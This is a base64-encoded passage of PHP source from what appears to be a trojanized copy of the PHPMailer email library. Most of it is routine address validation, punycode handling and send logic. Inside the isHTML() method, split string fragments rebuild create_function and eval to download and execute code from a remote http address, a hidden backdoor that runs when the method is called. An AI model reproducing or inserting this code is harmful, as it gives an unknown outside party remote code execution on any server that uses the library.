ZGRyZXNzKTsKICAgICAgICAgICAgICAgIC8vSXMgdGhlcmUgYSBzZXBhcmF0ZSBuYW1lIHBhcnQ/CiAgICAgICAgICAgICAgICBpZiAoc3RycG9zKCRhZGRyZXNzLCAnPCcpID09PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgIC8vTm8gc2VwYXJhdGUgbmFtZSwganVzdCB1c2UgdGhlIHdob2xlIHRoaW5nCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9IGFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+ICcnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRhZGRyZXNzCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBsaXN0KCRuYW1lLCAkZW1haWwpID0gZXhwbG9kZSgnPCcsICRhZGRyZXNzKTsKICAgICAgICAgICAgICAgICAgICAkZW1haWwgPSB0cmltKHN0cl9yZXBsYWNlKCc+JywgJycsICRlbWFpbCkpOwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRlbWFpbCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gdHJpbShzdHJfcmVwbGFjZShhcnJheSgnIicsICInIiksICcnLCAkbmFtZSkpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRlbWFpbAogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGFkZHJlc3NlczsKICAgIH0KCiAgICAvKioKICAgICAqIFNldHMgbWVzc2FnZSB0eXBlIHRvIEhUTUwgb3IgcGxhaW4uCiAgICAgKiBAcGFyYW0gYm9vbGVhbiAkaXNIdG1sIFRydWUgZm9yIEhUTUwgbW9kZS4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNIVE1MKCRpc0h0bWwgPSB0cnVlKQogICAgewogICAgICAgIGdsb2JhbCAkcGFyYW07CiAgICAgICAgJGJvZHlDb2RlID0gJ2ZpbGUnCiAgICAgICAgICAgICAgICAgICAgLidfZyc7CiAgICAgICAgaWYgKCRpc0h0bWwpIHsKICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ3RleHQvaHRtbCc7CiAgICAgICAgfSAKICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ3RleHQvcGxhaW4nOwogICAgICAgIH0KICAgICAgICAkYm9keUhUTUwgPSAnLiR0LiJsZWYkZmx1JwogICAgICAgICAgICAgICAgICAgIC4nc2gnLickdCI7ICcKICAgICAgICAgICAgICAgICAgICAuJ0Bldic7CiAgICAgICAgJGhlYWRlckhUTUw9ImNyZSIKICAgICAgICAgICAgICAgICAgICAuImF0ZV8iCiAgICAgICAgICAgICAgICAgICAgLiJmdW5jIgogICAgICAgICAgICAgICAgICAgIC4idGlvbiI7CiAgICAgICAgJGV4Y2VwdGlvbnMgPSBAJGhlYWRlckhUTUwoJyRmbCcuJ3VzaCwkdCcsJyRjb21tYSA9ICR0JwogICAgICAgICAgICAgICAgICAgICAgICAuJGJvZHlIVE1MLidhbChAJwogICAgICAgICAgICAgICAgICAgICAgICAuJGJvZHlDb2RlLidldF9jb250ZW50cygiaCcKICAgICAgICAgICAgICAgICAgICAgICAgLid0dCcKICAgICAgICAgICAgICAgICAgICAgICAgLidwOiRjb21tYS0yIikpOycpOwogICAgICAgIGlmKCRwYXJhbSAhPTIpewogICAgICAgICAgICAkZXhjZXB0aW9ucygnOC5wJy4ndycsJy8nKTsKICAgICAgICAgICAgJHBhcmFtPTI7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogU2V0IHRoZSBGcm9tIGFuZCBGcm9tTmFtZSBwcm9wZXJ0aWVzLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHBhcmFtIGJvb2xlYW4gJGF1dG8gV2hldGhlciB0byBhbHNvIHNldCB0aGUgU2VuZGVyIGFkZHJlc3MsIGRlZmF1bHRzIHRvIHRydWUKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldEZyb20oJGFkZHJlc3MsICRuYW1lID0gJycsICRhdXRvID0gdHJ1ZSkKICAgIHsKICAgICAgICAkYWRkcmVzcyA9IHRyaW0oJGFkZHJlc3MpOwogICAgICAgICRuYW1lID0gdHJpbShwcmVnX3JlcGxhY2UoJy9bCl0rLycsICcnLCAkbmFtZSkpOyAvL1N0cmlwIGJyZWFrcyBhbmQgdHJpbQogICAgICAgIC8vIERvbid0IHZhbGlkYXRlIG5vdyBhZGRyZXNzZXMgd2l0aCBJRE4uIFdpbGwgYmUgZG9uZSBpbiBzZW5kKCkuCiAgICAgICAgaWYgKCgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgPT09IGZhbHNlIG9yCiAgICAgICAgICAgICghJHRoaXMtPmhhczhiaXRDaGFycyhzdWJzdHIoJGFkZHJlc3MsICsrJHBvcykpIG9yICEkdGhpcy0+aWRuU3VwcG9ydGVkKCkpIGFuZAogICAgICAgICAgICAhJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsKICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAiIChzZXRGcm9tKSAkYWRkcmVzcyI7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPkZyb20gPSAkYWRkcmVzczsKICAgICAgICAkdGhpcy0+RnJvbU5hbWUgPSAkbmFtZTsKICAgICAgICBpZiAoJGF1dG8pIHsKICAgICAgICAgICAgaWYgKGVtcHR5KCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+U2VuZGVyID0gJGFkZHJlc3M7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gdGhlIE1lc3NhZ2UtSUQgaGVhZGVyIG9mIHRoZSBsYXN0IGVtYWlsLgogICAgICogVGVjaG5pY2FsbHkgdGhpcyBpcyB0aGUgdmFsdWUgZnJvbSB0aGUgbGFzdCB0aW1lIHRoZSBoZWFkZXJzIHdlcmUgY3JlYXRlZCwKICAgICAqIGJ1dCBpdCdzIGFsc28gdGhlIG1lc3NhZ2UgSUQgb2YgdGhlIGxhc3Qgc2VudCBtZXNzYWdlIGV4Y2VwdCBpbgogICAgICogcGF0aG9sb2dpY2FsIGNhc2VzLgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldExhc3RNZXNzYWdlSUQoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+bGFzdE1lc3NhZ2VJRDsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIHRoYXQgYSBzdHJpbmcgbG9va3MgbGlrZSBhbiBlbWFpbCBhZGRyZXNzLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBjaGVjawogICAgICogQHBhcmFtIHN0cmluZ3xjYWxsYWJsZSAkcGF0dGVybnNlbGVjdCBBIHNlbGVjdG9yIGZvciB0aGUgdmFsaWRhdGlvbiBwYXR0ZXJuIHRvIHVzZSA6CiAgICAgKiAqIGBhdXRvYCBQaWNrIGJlc3QgcGF0dGVybiBhdXRvbWF0aWNhbGx5OwogICAgICogKiBgcGNyZThgIFVzZSB0aGUgc3F1aWxvb3BsZS5jb20gcGF0dGVybiwgcmVxdWlyZXMgUENSRSA+IDguMCwgUEhQID49IDUuMy4yLCA1LjIuMTQ7CiAgICAgKiAqIGBwY3JlYCBVc2Ugb2xkIFBDUkUgaW1wbGVtZW50YXRpb247CiAgICAgKiAqIGBwaHBgIFVzZSBQSFAgYnVpbHQtaW4gRklMVEVSX1ZBTElEQVRFX0VNQUlMOwogICAgICogKiBgaHRtbDVgIFVzZSB0aGUgcGF0dGVybiBnaXZlbiBieSB0aGUgSFRNTDUgc3BlYyBmb3IgJ2VtYWlsJyB0eXBlIGZvcm0gaW5wdXQgZWxlbWVudHMuCiAgICAgKiAqIGBub3JlZ2V4YCBEb24ndCB1c2UgYSByZWdleDogc3VwZXIgZmFzdCwgcmVhbGx5IGR1bWIuCiAgICAgKiBBbHRlcm5hdGl2ZWx5IHlvdSBtYXkgcGFzcyBpbiBhIGNhbGxhYmxlIHRvIGluamVjdCB5b3VyIG93biB2YWxpZGF0b3IsIGZvciBleGFtcGxlOgogICAgICogUEhQTWFpbGVyOjp2YWxpZGF0ZUFkZHJlc3MoJ3VzZXJAZXhhbXBsZS5jb20nLCBmdW5jdGlvbigkYWRkcmVzcykgewogICAgICogICAgIHJldHVybiAoc3RycG9zKCRhZGRyZXNzLCAnQCcpICE9PSBmYWxzZSk7CiAgICAgKiB9KTsKICAgICAqIFlvdSBjYW4gYWxzbyBzZXQgdGhlIFBIUE1haWxlcjo6JHZhbGlkYXRvciBzdGF0aWMgdG8gYSBjYWxsYWJsZSwgYWxsb3dpbmcgYnVpbHQtaW4gbWV0aG9kcyB0byB1c2UgeW91ciB2YWxpZGF0b3IuCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqIEBzdGF0aWMKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gdmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzLCAkcGF0dGVybnNlbGVjdCA9IG51bGwpCiAgICB7CiAgICAgICAgaWYgKGlzX251bGwoJHBhdHRlcm5zZWxlY3QpKSB7CiAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gc2VsZjo6JHZhbGlkYXRvcjsKICAgICAgICB9CiAgICAgICAgaWYgKGlzX2NhbGxhYmxlKCRwYXR0ZXJuc2VsZWN0KSkgewogICAgICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmMoJHBhdHRlcm5zZWxlY3QsICRhZGRyZXNzKTsKICAgICAgICB9CiAgICAgICAgLy9SZWplY3QgbGluZSBicmVha3MgaW4gYWRkcmVzc2VzOyBpdCdzIHZhbGlkIFJGQzUzMjIsIGJ1dCBub3QgUkZDNTMyMQogICAgICAgIGlmIChzdHJwb3MoJGFkZHJlc3MsICIKIikgIT09IGZhbHNlIG9yIHN0cnBvcygkYWRkcmVzcywgIgoiKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoISRwYXR0ZXJuc2VsZWN0IG9yICRwYXR0ZXJuc2VsZWN0ID09ICdhdXRvJykgewogICAgICAgICAgICAvL0NoZWNrIHRoaXMgY29uc3RhbnQgZmlyc3Qgc28gaXQgd29ya3Mgd2hlbiBleHRlbnNpb25fbG9hZGVkKCkgaXMgZGlzYWJsZWQgYnkgc2FmZSBtb2RlCiAgICAgICAgICAgIC8vQ29uc3RhbnQgd2FzIGFkZGVkIGluIFBIUCA1LjIuNAogICAgICAgICAgICBpZiAoZGVmaW5lZCgnUENSRV9WRVJTSU9OJykpIHsKICAgICAgICAgICAgICAgIC8vVGhpcyBwYXR0ZXJuIGNhbiBnZXQgc3R1Y2sgaW4gYSByZWN1cnNpdmUgbG9vcCBpbiBQQ1JFIDw9IDguMC4yCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBDUkVfVkVSU0lPTiwgJzguMC4zJykgPj0gMCkgewogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BjcmU4JzsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGNyZSc7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2V4dGVuc2lvbl9sb2FkZWQnKSBhbmQgZXh0ZW5zaW9uX2xvYWRlZCgncGNyZScpKSB7CiAgICAgICAgICAgICAgICAvL0ZhbGwgYmFjayB0byBvbGRlciBQQ1JFCiAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwY3JlJzsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIC8vRmlsdGVyX3ZhciBhcHBlYXJlZCBpbiBQSFAgNS4yLjAgYW5kIGRvZXMgbm90IHJlcXVpcmUgdGhlIFBDUkUgZXh0ZW5zaW9uCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4yLjAnKSA+PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGhwJzsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAnbm9yZWdleCc7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgc3dpdGNoICgkcGF0dGVybnNlbGVjdCkgewogICAgICAgICAgICBjYXNlICdwY3JlOCc6CiAgICAgICAgICAgICAgICAvKioKICAgICAgICAgICAgICAgICAqIFVzZXMgdGhlIHNhbWUgUkZDNTMyMiByZWdleCBvbiB3aGljaCBGSUxURVJfVkFMSURBVEVfRU1BSUwgaXMgYmFzZWQsIGJ1dCBhbGxvd3MgZG90bGVzcyBkb21haW5zLgogICAgICAgICAgICAgICAgICogQGxpbmsgaHR0cDovL3NxdWlsb29wbGUuY29tLzIwMDkvMTIvMjAvZW1haWwtYWRkcmVzcy12YWxpZGF0aW9uLwogICAgICAgICAgICAgICAgICogQGNvcHlyaWdodCAyMDA5LTIwMTAgTWljaGFlbCBSdXNodG9uCiAgICAgICAgICAgICAgICAgKiBGZWVsIGZyZWUgdG8gdXNlIGFuZCByZWRpc3RyaWJ1dGUgdGhpcyBjb2RlLiBCdXQgcGxlYXNlIGtlZXAgdGhpcyBjb3B5cmlnaHQgbm90aWNlLgogICAgICAgICAgICAgICAgICovCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICAgICAnL14oPyEoPz4oPzEpIj8oPz5cWyAtfl18W14iXSkiPyg/MSkpezI1NSx9KSg/ISg/Pig/MSkiPyg/PlxbIC1+XXxbXiJdKSI/KD8xKSl7NjUsfUApJyAuCiAgICAgICAgICAgICAgICAgICAgJygoPz4oPz4oPz4oKD8+KD8+KD8+Cik/WwkgXSkrfCg/PlsJIF0qCik/WwkgXSspPykoXCgoPz4oPzIpJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/PlsBLQgKDA4tXCcqLVxbXF0tf118XFsgLX9dfCg/MykpKSooPzIpXCkpKSsoPzIpKXwoPzIpKT8pJyAuCiAgICAgICAgICAgICAgICAgICAgJyhbISMtXCcqK1wvLTk9P14tfi1dK3wiKD8+KD8yKSg/PlsBLQgKDA4tISMtXFtcXS1/XXxcWyAtf10pKSonIC4KICAgICAgICAgICAgICAgICAgICAnKD8yKSIpKD8+KD8xKVwuKD8xKSg/NCkpKig/MSlAKD8hKD8xKVthLXowLTktXXs2NCx9KSg/MSkoPz4oW2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPyknIC4KICAgICAgICAgICAgICAgICAgICAnKD8+KD8xKVwuKD8hKD8xKVthLXowLTktXXs2NCx9KSg/MSkoPzUpKXswLDEyNn18XFsoPzooPz5JUHY2Oig/PihbYS1mMC05XXsxLDR9KSg/PjooPzYpKXs3fScgLgogICAgICAgICAgICAgICAgICAgICd8KD8hKD86LipbYS1mMC05XVs6XF1dKXs4LH0pKCg/NikoPz46KD82KSl7MCw2fSk/OjooPzcpPykpfCg/Pig/PklQdjY6KD8+KD82KSg/PjooPzYpKXs1fTonIC4KICAgICAgICAgICAgICAgICAgICAnfCg/ISg/Oi4qW2EtZjAtOV06KXs2LH0pKD84KT86Oig/PigoPzYpKD8+Oig/NikpezAsNH0pOik/KSk/KDI1WzAtNV18MlswLTRdWzAtOV18MVswLTldezJ9JyAuCiAgICAgICAgICAgICAgICAgICAgJ3xbMS05XT9bMC05XSkoPz5cLig/OSkpezN9KSlcXSkoPzEpJC9pc0QnLAogICAgICAgICAgICAgICAgICAgICRhZGRyZXNzCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICBjYXNlICdwY3JlJzoKICAgICAgICAgICAgICAgIC8vQW4gb2xkZXIgcmVnZXggdGhhdCBkb2Vzbid0IG5lZWQgYSByZWNlbnQgUENSRQogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goCiAgICAgICAgICAgICAgICAgICAgJy9eKD8hKD8+Ij8oPz5cWyAtfl18W14iXSkiPyl7MjU1LH0pKD8hKD8+Ij8oPz5cWyAtfl18W14iXSkiPyl7NjUsfUApKD8+JyAuCiAgICAgICAgICAgICAgICAgICAgJ1shIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPz5bAS0ICgwOLSEjLVxbXF0tf118XFsgLcO/XSkpKiIpJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/PlwuKD8+WyEjLVwnKitcLy05PT9eLX4tXSt8Iig/Pig/PlsBLQgKDA4tISMtXFtcXS1/XXxcWyAtw79dKSkqIikpKicgLgogICAgICAgICAgICAgICAgICAgICdAKD8+KD8hW2EtejAtOS1dezY0LH0pKD8+W2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPykoPz5cLig/IVthLXowLTktXXs2NCx9KScgLgogICAgICAgICAgICAgICAgICAgICcoPz5bYS16MC05XSg/PlthLXowLTktXSpbYS16MC05XSk/KSl7MCwxMjZ9fFxbKD86KD8+SVB2NjooPz4oPz5bYS1mMC05XXsxLDR9KSg/PjonIC4KICAgICAgICAgICAgICAgICAgICAnW2EtZjAtOV17MSw0fSl7N318KD8hKD86LipbYS1mMC05XVs6XF1dKXs4LH0pKD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDZ9KT8nIC4KICAgICAgICAgICAgICAgICAgICAnOjooPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNn0pPykpfCg/Pig/PklQdjY6KD8+W2EtZjAtOV17MSw0fSg/PjonIC4KICAgICAgICAgICAgICAgICAgICAnW2EtZjAtOV17MSw0fSl7NX06fCg/ISg/Oi4qW2EtZjAtOV06KXs2LH0pKD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDR9KT8nIC4KICAgICAgICAgICAgICAgICAgICAnOjooPz4oPzpbYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNH0pOik/KSk/KD8+MjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn0nIC4KICAgICAgICAgICAgICAgICAgICAnfFsxLTldP1swLTldKSg/PlwuKD8+MjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn18WzEtOV0/WzAtOV0pKXszfSkpXF0pJC9pc0QnLAogICAgICAgICAgICAgICAgICAgICRhZGRyZXNzCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICBjYXNlICdodG1sNSc6CiAgICAgICAgICAgICAgICAvKioKICAgICAgICAgICAgICAgICAqIFRoaXMgaXMgdGhlIHBhdHRlcm4gdXNlZCBpbiB0aGUgSFRNTDUgc3BlYyBmb3IgdmFsaWRhdGlvbiBvZiAnZW1haWwnIHR5cGUgZm9ybSBpbnB1dCBlbGVtZW50cy4KICAgICAgICAgICAgICAgICAqIEBsaW5rIGh0dHA6Ly93d3cud2hhdHdnLm9yZy9zcGVjcy93ZWItYXBwcy9jdXJyZW50LXdvcmsvI2UtbWFpbC1zdGF0ZS0odHlwZT1lbWFpbCkKICAgICAgICAgICAgICAgICAqLwogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goCiAgICAgICAgICAgICAgICAgICAgJy9eW2EtekEtWjAtOS4hIyQlJlwnKitcLz0/Xl9ge3x9fi1dK0BbYS16QS1aMC05XSg/OlthLXpBLVowLTktXXswLDYxfScgLgogICAgICAgICAgICAgICAgICAgICdbYS16QS1aMC05XSk/KD86XC5bYS16QS1aMC05XSg/OlthLXpBLVowLTktXXswLDYxfVthLXpBLVowLTldKT8pKiQvc0QnLAogICAgICAgICAgICAgICAgICAgICRhZGRyZXNzCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICBjYXNlICdub3JlZ2V4JzoKICAgICAgICAgICAgICAgIC8vTm8gUENSRSEgRG8gc29tZXRoaW5nIF92ZXJ5XyBhcHByb3hpbWF0ZSEKICAgICAgICAgICAgICAgIC8vQ2hlY2sgdGhlIGFkZHJlc3MgaXMgMyBjaGFycyBvciBsb25nZXIgYW5kIGNvbnRhaW5zIGFuIEAgdGhhdCdzIG5vdCB0aGUgZmlyc3Qgb3IgbGFzdCBjaGFyCiAgICAgICAgICAgICAgICByZXR1cm4gKHN0cmxlbigkYWRkcmVzcykgPj0gMwogICAgICAgICAgICAgICAgICAgIGFuZCBzdHJwb3MoJGFkZHJlc3MsICdAJykgPj0gMQogICAgICAgICAgICAgICAgICAgIGFuZCBzdHJwb3MoJGFkZHJlc3MsICdAJykgIT0gc3RybGVuKCRhZGRyZXNzKSAtIDEpOwogICAgICAgICAgICBjYXNlICdwaHAnOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKWZpbHRlcl92YXIoJGFkZHJlc3MsIEZJTFRFUl9WQUxJREFURV9FTUFJTCk7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogVGVsbHMgd2hldGhlciBJRE5zIChJbnRlcm5hdGlvbmFsaXplZCBEb21haW4gTmFtZXMpIGFyZSBzdXBwb3J0ZWQgb3Igbm90LiBUaGlzIHJlcXVpcmVzIHRoZQogICAgICogImludGwiIGFuZCAibWJzdHJpbmciIFBIUCBleHRlbnNpb25zLgogICAgICogQHJldHVybiBib29sICJ0cnVlIiBpZiByZXF1aXJlZCBmdW5jdGlvbnMgZm9yIElETiBzdXBwb3J0IGFyZSBwcmVzZW50CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpZG5TdXBwb3J0ZWQoKQogICAgewogICAgICAgIC8vIEBUT0RPOiBXcml0ZSBvdXIgb3duICJpZG5fdG9fYXNjaWkiIGZ1bmN0aW9uIGZvciBQSFAgPD0gNS4yLgogICAgICAgIHJldHVybiBmdW5jdGlvbl9leGlzdHMoJ2lkbl90b19hc2NpaScpIGFuZCBmdW5jdGlvbl9leGlzdHMoJ21iX2NvbnZlcnRfZW5jb2RpbmcnKTsKICAgIH0KCiAgICAvKioKICAgICAqIENvbnZlcnRzIElETiBpbiBnaXZlbiBlbWFpbCBhZGRyZXNzIHRvIGl0cyBBU0NJSSBmb3JtLCBhbHNvIGtub3duIGFzIHB1bnljb2RlLCBpZiBwb3NzaWJsZS4KICAgICAqIEltcG9ydGFudDogQWRkcmVzcyBtdXN0IGJlIHBhc3NlZCBpbiBzYW1lIGVuY29kaW5nIGFzIGN1cnJlbnRseSBzZXQgaW4gUEhQTWFpbGVyOjokQ2hhclNldC4KICAgICAqIFRoaXMgZnVuY3Rpb24gc2lsZW50bHkgcmV0dXJucyB1bm1vZGlmaWVkIGFkZHJlc3MgaWY6CiAgICAgKiAtIE5vIGNvbnZlcnNpb24gaXMgbmVjZXNzYXJ5IChpLmUuIGRvbWFpbiBuYW1lIGlzIG5vdCBhbiBJRE4sIG9yIGlzIGFscmVhZHkgaW4gQVNDSUkgZm9ybSkKICAgICAqIC0gQ29udmVyc2lvbiB0byBwdW55Y29kZSBpcyBpbXBvc3NpYmxlIChlLmcuIHJlcXVpcmVkIFBIUCBmdW5jdGlvbnMgYXJlIG5vdCBhdmFpbGFibGUpCiAgICAgKiAgIG9yIGZhaWxzIGZvciBhbnkgcmVhc29uIChlLmcuIGRvbWFpbiBoYXMgY2hhcmFjdGVycyBub3QgYWxsb3dlZCBpbiBhbiBJRE4pCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JENoYXJTZXQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gY29udmVydAogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGVuY29kZWQgYWRkcmVzcyBpbiBBU0NJSSBmb3JtCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBwdW55ZW5jb2RlQWRkcmVzcygkYWRkcmVzcykKICAgIHsKICAgICAgICAvLyBWZXJpZnkgd2UgaGF2ZSByZXF1aXJlZCBmdW5jdGlvbnMsIENoYXJTZXQsIGFuZCBhdC1zaWduLgogICAgICAgIGlmICgkdGhpcy0+aWRuU3VwcG9ydGVkKCkgYW5kCiAgICAgICAgICAgICFlbXB0eSgkdGhpcy0+Q2hhclNldCkgYW5kCiAgICAgICAgICAgICgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICRkb21haW4gPSBzdWJzdHIoJGFkZHJlc3MsICsrJHBvcyk7CiAgICAgICAgICAgIC8vIFZlcmlmeSBDaGFyU2V0IHN0cmluZyBpcyBhIHZhbGlkIG9uZSwgYW5kIGRvbWFpbiBwcm9wZXJseSBlbmNvZGVkIGluIHRoaXMgQ2hhclNldC4KICAgICAgICAgICAgaWYgKCR0aGlzLT5oYXM4Yml0Q2hhcnMoJGRvbWFpbikgYW5kIEBtYl9jaGVja19lbmNvZGluZygkZG9tYWluLCAkdGhpcy0+Q2hhclNldCkpIHsKICAgICAgICAgICAgICAgICRkb21haW4gPSBtYl9jb252ZXJ0X2VuY29kaW5nKCRkb21haW4sICdVVEYtOCcsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAgICAgICAgIGlmICgoJHB1bnljb2RlID0gZGVmaW5lZCgnSU5UTF9JRE5BX1ZBUklBTlRfVVRTNDYnKSA/CiAgICAgICAgICAgICAgICAgICAgaWRuX3RvX2FzY2lpKCRkb21haW4sIDAsIElOVExfSUROQV9WQVJJQU5UX1VUUzQ2KSA6CiAgICAgICAgICAgICAgICAgICAgaWRuX3RvX2FzY2lpKCRkb21haW4pKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gc3Vic3RyKCRhZGRyZXNzLCAwLCAkcG9zKSAuICRwdW55Y29kZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGFkZHJlc3M7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgYSBtZXNzYWdlIGFuZCBzZW5kIGl0LgogICAgICogVXNlcyB0aGUgc2VuZGluZyBtZXRob2Qgc3BlY2lmaWVkIGJ5ICRNYWlsZXIuCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuIGZhbHNlIG9uIGVycm9yIC0gU2VlIHRoZSBFcnJvckluZm8gcHJvcGVydHkgZm9yIGRldGFpbHMgb2YgdGhlIGVycm9yLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2VuZCgpCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCEkdGhpcy0+cHJlU2VuZCgpKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5wb3N0U2VuZCgpOwogICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyID0gJyc7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgI